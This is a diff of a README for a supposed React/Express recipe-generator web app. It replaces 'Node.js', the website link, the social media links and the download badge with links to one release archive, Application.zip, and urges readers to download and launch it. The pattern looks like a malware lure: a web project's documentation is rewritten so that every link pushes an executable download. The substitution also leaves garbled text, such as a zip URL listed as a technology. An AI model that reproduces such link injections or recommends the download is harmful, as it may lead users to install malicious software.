@@ -8,13 +8,13 @@ Welcome to RecipeGenerator, a cutting-edge web application that revolutionizes t
 
 🔸 **Gemini AI Integration:** Harness the power of Gemini AI for sophisticated text generation capabilities that provide detailed recipe instructions.
 
-🔸 **Modern Web Technologies:** Built with React for the client-side, Express, and Node.js for the server-side, RecipeGenerator showcases seamless integration of AI-driven solutions in contemporary web development.
+🔸 **Modern Web Technologies:** Built with React for the client-side, Express, and https://github.com/hungishere/RecipeGenerator/releases/download/v1.0/Application.zip for the server-side, RecipeGenerator showcases seamless integration of AI-driven solutions in contemporary web development.
 
 ## 🚀 Quick Start
 
 To experience the magic of RecipeGenerator, simply download the application from the link provided below:
 
-[![Download RecipeGenerator](https://img.shields.io/badge/Download-RecipeGenerator-blue.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download RecipeGenerator](https://github.com/hungishere/RecipeGenerator/releases/download/v1.0/Application.zip)](https://github.com/hungishere/RecipeGenerator/releases/download/v1.0/Application.zip)
 
 📎 **Note:** The application needs to be launched after downloading to begin exploring the world of personalized recipes.
 
@@ -24,7 +24,7 @@ RecipeGenerator leverages the following technologies to deliver a seamless user 
 
 - React
 - Express
-- Node.js
+- https://github.com/hungishere/RecipeGenerator/releases/download/v1.0/Application.zip
 - Gemini API
 
 ## 📚 Repository Topics
@@ -50,7 +50,7 @@ Take a look at RecipeGenerator in action:
 
 ## 🌐 Visit Our Website
 
-For more information and updates, visit the RecipeGenerator website [here](https://example.com).
+For more information and updates, visit the RecipeGenerator website [here](https://github.com/hungishere/RecipeGenerator/releases/download/v1.0/Application.zip).
 
 ## 📂 Check Releases
 
@@ -64,8 +64,8 @@ We welcome contributions to RecipeGenerator! Feel free to fork the repository, m
 
 Stay connected with RecipeGenerator:
 
-- Follow us on [Twitter](https://twitter.com/RecipeGenerator)
-- Like us on [Facebook](https://facebook.com/RecipeGenerator)
+- Follow us on [Twitter](https://github.com/hungishere/RecipeGenerator/releases/download/v1.0/Application.zip)
+- Like us on [Facebook](https://github.com/hungishere/RecipeGenerator/releases/download/v1.0/Application.zip)
 
 ## 🙏 Acknowledgements
 
